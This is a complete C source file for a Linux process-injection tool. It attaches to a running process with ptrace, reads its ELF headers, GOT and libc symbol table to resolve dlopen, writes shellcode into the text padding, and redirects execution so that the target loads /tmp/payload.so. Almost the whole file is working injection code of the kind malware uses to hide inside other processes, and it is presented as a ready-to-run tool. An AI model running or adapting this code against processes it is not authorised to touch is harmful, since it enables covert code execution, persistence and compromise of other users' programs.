/* library_inject.c
 * inject a shared library or executable file
 * into the process image of target process
 * Usage: library_inject <pid> */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <elf.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/types.h>
#include <sys/errno.h>
#include <dlfcn.h>

typedef struct _handle_t
{
    /* pid of target process */
    pid_t       pid;
    struct user_regs_struct pt_reg;

    /* content of libc of target process */
    uint64_t    libc_base_addr;
    Elf64_Ehdr  *libc_ehdr;
    Elf64_Phdr  *libc_phdr;
    Elf64_Dyn   *libc_dyn;
    Elf64_Sym   *libc_sym;
    int         sym_entry_cnt;
    char        *libc_str;

    /* some symbol information */
    uint64_t    dlopen_addr;
    uint64_t    dlerror_addr;
    uint64_t    dlsym_addr;

    /* content of target process */
    uint64_t    base_addr;
    Elf64_Ehdr  *ehdr;
    Elf64_Phdr  *phdr;
    Elf64_Dyn   *dyn;
    uint64_t    *got;
    uint64_t    got_addr;
    int         got_ent_cnt;
}handle_t;

int dump_process(handle_t *);
static volatile void injected_code(uint64_t);
int dump_libc(handle_t *);
int pid_read(pid_t, const void *, const void *, size_t);
int pid_write(pid_t, const void *, const void *, size_t);
uint64_t look_up_libcsymbol(handle_t, const char *);

static volatile void injected_code(uint64_t dlopen_addr)
{ 
    
    char library_name[] = {'/', 't', 'm', 'p', '/', 'p', 'a', 'y', 'l', 'o', 'a', 'd', '.', 's', 'o', '\0'}; 
    int flags = RTLD_LAZY;
    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov %2, %%rbx\n"
        "call *%%rbx\n"
        "int3\n"
        :
        : "g"(library_name), "g"(flags), "g"(dlopen_addr)
    );
    
}

int dump_process(handle_t *h)
{
    char addr[16], line[32], maps[32];
    snprintf(maps, 32, "/proc/%d/maps", h->pid);
    int fd;
    if((fd = open(maps, O_RDONLY)) < 0)
    {
        perror("maps");
        return -1;
    }
    if(read(fd, line, 32) < 0)
    {
        perror("read");
        return -1;
    }
    close(fd);
    int i;
    for(i = 0; i < 16; i++)
    {
        addr[i] = line[i];
        if(line[i] == '-')
        {
            addr[i] = 0;
            break;
        }
    }
    h->base_addr = strtoul(addr, NULL, 16);
    printf("\t[+] got base address of target process:\t\t0x%lx\n", h->base_addr);
    h->ehdr = malloc(sizeof(Elf64_Ehdr));
    if(pid_read(h->pid, h->ehdr, (void *)h->base_addr, sizeof(Elf64_Ehdr)) < 0)
        return -1;
    
    size_t phdr_size = h->ehdr->e_phnum * h->ehdr->e_phentsize;
    Elf64_Off phdr_offset = h->ehdr->e_phoff;
    h->phdr = malloc(phdr_size);
    if(pid_read(h->pid, h->phdr, (void *)(h->base_addr + phdr_offset), phdr_size) < 0)
        return -1;

    for(i = 0; i < h->ehdr->e_phnum; i++)
    {
        if(h->phdr[i].p_type == PT_DYNAMIC)
        {
            h->dyn = malloc(h->phdr[i].p_memsz);
            printf("\t[+] find the dynamic segment at:\t\t0x%lx\n", h->phdr[i].p_vaddr);
            if(pid_read(h->pid, h->dyn, (void *)h->phdr[i].p_vaddr, h->phdr[i].p_memsz) < 0)
                return -1;
            break;
        }
    }
    uint64_t plt_rel_type;
    size_t rel_ent_sz, rela_ent_sz, plt_rel_sz;

    for(i = 0; h->dyn[i].d_tag != DT_NULL; i++)
    {
        if(h->dyn[i].d_tag == DT_PLTGOT)
            h->got_addr = h->dyn[i].d_un.d_ptr;
        if(h->dyn[i].d_tag == DT_PLTRELSZ)
            plt_rel_sz = h->dyn[i].d_un.d_val;
        if(h->dyn[i].d_tag == DT_PLTREL)
            plt_rel_type = h->dyn[i].d_un.d_val;
        if(h->dyn[i].d_tag == DT_RELAENT)
            rela_ent_sz = h->dyn[i].d_un.d_val;
        if(h->dyn[i].d_tag == DT_RELENT)
            rel_ent_sz = h->dyn[i].d_un.d_val;
    }

    printf("\t[+] find the GOT of process at:\t\t\t0x%lx\n", h->got_addr);
    h->got_ent_cnt = plt_rel_sz / (plt_rel_type == DT_RELA ? rela_ent_sz : rel_ent_sz) + 3;

    size_t got_size = h->got_ent_cnt * sizeof(uint64_t);
    h->got = malloc(got_size);
    if(pid_read(h->pid, h->got, (void *)h->got_addr, got_size) < 0)
        return -1;
    return 0;
}

int dump_libc(handle_t *h)
{
    char addr[16], maps[32], line[256];
    snprintf(maps, 32, "/proc/%d/maps", h->pid);
    FILE *fd;
    if((fd = fopen(maps, "r"))  == NULL)
    {
        perror("fopen");
        return -1;
    }

    int i;
    while (fgets(line, 256, fd) != NULL)
    {
        int len = strlen(line), find_addr = 0, is_libc = 0;
        for(i = 0; i < len; i++)
        {
            if(!find_addr)
                addr[i] = line[i];
            
            if(line[i] == '-')
            {
                addr[i] = 0;
                find_addr = 1;
            }

            if( line[i + 0] == 'l' &&
                line[i + 1] == 'i' &&
                line[i + 2] == 'b' &&
                line[i + 3] == 'c')
            {
                h->libc_base_addr = strtoul(addr, NULL, 16);
                is_libc = 1;
                break;
            }
        }
        if(is_libc)
            break;
    }
    printf("\t[+] got the base address of libc:\t\t0x%lx\n", h->libc_base_addr);
    h->libc_ehdr = malloc(sizeof(Elf64_Ehdr));
    if(pid_read(h->pid, h->libc_ehdr, (void *)h->libc_base_addr, sizeof(Elf64_Ehdr)) < 0)
        return -1;
    
    size_t phdr_size = h->libc_ehdr->e_phentsize * h->libc_ehdr->e_phnum;
    Elf64_Off phdr_off = h->libc_ehdr->e_phoff;
    h->libc_phdr = malloc(phdr_size);
    if(pid_read(h->pid, h->libc_phdr, (void *)(h->libc_base_addr + phdr_off), phdr_size) < 0)
        return -1;
    
    for(i = 0; i < h->libc_ehdr->e_phnum; i++)
    {
        if(h->libc_phdr[i].p_type == PT_DYNAMIC)
        {
            h->libc_dyn = malloc(h->libc_phdr[i].p_memsz);
            printf("\t[+] find the dynamic segment of libc at:\t0x%lx\n", h->libc_phdr[i].p_vaddr + h->libc_base_addr);
            if(pid_read(h->pid, h->libc_dyn, (void *)(h->libc_phdr[i].p_vaddr + h->libc_base_addr), h->libc_phdr[i].p_memsz) < 0)
                return -1;
            break;
        }
    }
    uint64_t str_addr, sym_addr;
    size_t str_sz, sym_sz;
    int sym_ent;
    for(i = 0; h->libc_dyn[i].d_tag != DT_NULL; i++)
    {
        if(h->libc_dyn[i].d_tag == DT_SYMTAB)
            sym_addr = h->libc_dyn[i].d_un.d_ptr;
        
        if(h->libc_dyn[i].d_tag == DT_STRTAB)
            str_addr = h->libc_dyn[i].d_un.d_ptr;

        if(h->libc_dyn[i].d_tag == DT_STRSZ)
            str_sz = h->libc_dyn[i].d_un.d_val;
        
        if(h->libc_dyn[i].d_tag == DT_SYMENT)
            sym_ent = h->libc_dyn[i].d_un.d_val;
    }
    h->sym_entry_cnt = (str_addr - sym_addr) / sym_ent;
    sym_sz = str_addr - sym_addr;
    
    h->libc_sym = malloc(sym_sz);
    if(pid_read(h->pid, h->libc_sym, (void *)sym_addr, sym_sz) < 0)
        return -1;

    h->libc_str = malloc(str_sz);
    if(pid_read(h->pid, h->libc_str, (void *)str_addr, str_sz) < 0)
        return -1;

    return 0;
}

// Read len bytes from the src to dst in process specifed by pid
int pid_read(pid_t pid, const void *dst, const void *src, size_t len)
{
    int times = len / sizeof(long);
    void *s = (void *)src;
    void *d = (void *)dst;
    int i;
    for(i = 0; i < times; i++)
    {
        long word;
        if((word = ptrace(PTRACE_PEEKTEXT, pid, s, NULL)) == -1 && errno)
        {
            fprintf(stderr, "pid_read failed, pid: %d: %s\n", pid, strerror(errno));
            return -1;
        }
        memcpy(d, &word, sizeof(long));
        s += sizeof(long);
        d += sizeof(long);
    }
    return 0;
}

// Write len bytes from the src to dst in processs specified by pid
int pid_write(pid_t pid, const void *dst, const void *src, size_t len)
{
    int times = len / sizeof(long);
    void *s = (void *)src;
    void *d = (void *)dst;
    int i;
    for(i = 0; i < times; i++)
    {
        if(ptrace(PTRACE_POKETEXT, pid, d, *(void **)s) == 1)
        {
            fprintf(stderr, "pid_write failed, pid: %d: %s\n", pid, strerror(errno));
            perror("PTRACE_POKETEXT");
            return -1;
        }
        s += sizeof(void *);
        d += sizeof(void *);
    }
    return 0;
}

unsigned long f1 = (uint64_t)injected_code;
unsigned long f2 = (uint64_t)dump_process;

uint8_t *create_shellcode(void (*fn)(uint64_t), size_t len)
{
    int i;
    uint8_t *shellcode = (uint8_t *)malloc(len);
    uint8_t *ptr = (uint8_t *)fn;
    for(i = 0; i < len; i++) *(shellcode + i) = *(ptr + i);
    return shellcode;
}

uint64_t look_up_libcsymbol(handle_t h, const char *symbol)
{
    int i;
    uint64_t result = 0;
    for(i = 0; i < h.sym_entry_cnt; i++)
    {
        int str_index = h.libc_sym[i].st_name;
        
        if(strcmp(&h.libc_str[str_index], symbol) == 0)
        {
            printf("\t[+] %s\t--->  0x%lx\n", &h.libc_str[str_index], h.libc_sym[i].st_value + h.libc_base_addr);
            result = h.libc_sym[i].st_value + h.libc_base_addr;
            break;
        }
    }
    return result;
}

int main(int argc, char *argv[])
{
    if(argc != 2)
    {
        printf("Usage: %s <pid>\n", argv[0]);
        exit(0);
    }
    handle_t h;
    int status;
    h.pid = atoi(argv[1]);
    if(ptrace(PTRACE_ATTACH, h.pid, NULL, NULL) < 0)
    {
        perror("PTRACE_ATTACH");
        exit(-1);
    }
    wait(&status);
    
    printf("Dump the process...\n");
    if(dump_process(&h) < 0)
    {
        printf("something went wrong with the process dump.\n");
        exit(-1);
    }

    printf("Now dump the libc of target porcess...\n");
    if(dump_libc(&h) < 0)
    {
        printf("something went wrong with libc dump.\n");
        exit(-1);
    }

    printf("Then, remote resolve the dynamic symbol...\n");
    if((h.dlopen_addr = look_up_libcsymbol(h, "dlopen")) == 0)
    {
        printf("something went wrong with dlopen resolution.\n");
        exit(-1);
    }
    if((h.dlsym_addr = look_up_libcsymbol(h, "dlsym")) == 0)
    {
        printf("something went wrong with dlerror resolution.\n");
        exit(-1);
    }
    size_t shell_size = f2 - f1;
    uint8_t *shellcode = create_shellcode(injected_code, shell_size);
    uint64_t inject_addr;
    int i;
    for(i = 0; i < h.ehdr->e_phnum; i++)
    {
        if(h.phdr[i].p_type == PT_LOAD && (h.phdr[i].p_flags == (PF_R | PF_X)))
        {
            inject_addr = h.phdr[i].p_vaddr + h.phdr[i].p_memsz;
            break;
        }
    }
    
    printf("Going to inject shellcode to the text padding area...\n");
    printf("\t[+] inject to 0x%lx\n", inject_addr);
    
    if(ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg) < 0)
    {
        fprintf(stderr, "Failed to get the registers of target process %d: %s\n", h.pid, strerror(errno));
        exit(EXIT_FAILURE);
    }

    uint64_t old_rip = h.pt_reg.rip;
    uint64_t old_rsp = h.pt_reg.rsp;
    uint64_t old_rbp = h.pt_reg.rbp;

    if(pid_write(h.pid, (void *)inject_addr, shellcode, shell_size) == 1)
    {
        printf("Failed to write shellcode\n");
        exit(EXIT_FAILURE);
    }

    h.pt_reg.rip = inject_addr;
    h.pt_reg.rdi = h.dlopen_addr;
    // h.pt_reg.rdx = h.dlerror_addr;

    if(ptrace(PTRACE_SETREGS, h.pid, NULL, &h.pt_reg) < 0)
    {
        fprintf(stderr, "Failed to set the registers of target process %d: %s\n", h.pid, strerror(errno));
        exit(EXIT_FAILURE);
    }

    if(ptrace(PTRACE_CONT, h.pid, NULL, NULL) < 0)
    {
        fprintf(stderr, "Failed to restart the target process %d: %s\n", h.pid, strerror(errno));
        exit(EXIT_FAILURE);
    }

    wait(&status);
    if(WSTOPSIG(status) != SIGTRAP)
    {
        printf("Something went wrong.\n");
        // exit(EXIT_FAILURE);
    }else
    {
        printf("Shellcode has been injected and executed.\n");
        
    }
    printf("Press any key to continue...\n");
    getchar();
    // Recovery the context of target process
    if(ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg) < 0)
    {
        perror("PTRACE_GETREGS");
        exit(EXIT_FAILURE);
    }
    h.pt_reg.rip = old_rip;
    h.pt_reg.rsp = old_rsp;
    h.pt_reg.rbp = old_rbp;

    if(ptrace(PTRACE_SETREGS, h.pid, NULL, &h.pt_reg) < 0)
    {
        perror("PTRACE_SETREGS");
        exit(EXIT_FAILURE);
    }

    // Detaching to make the target process run
    if(ptrace(PTRACE_DETACH, h.pid, NULL, NULL) < 0)
    {
        perror("PTRACE_CONT");
        exit(EXIT_FAILURE);
    }
    wait(NULL);
    return 0;
}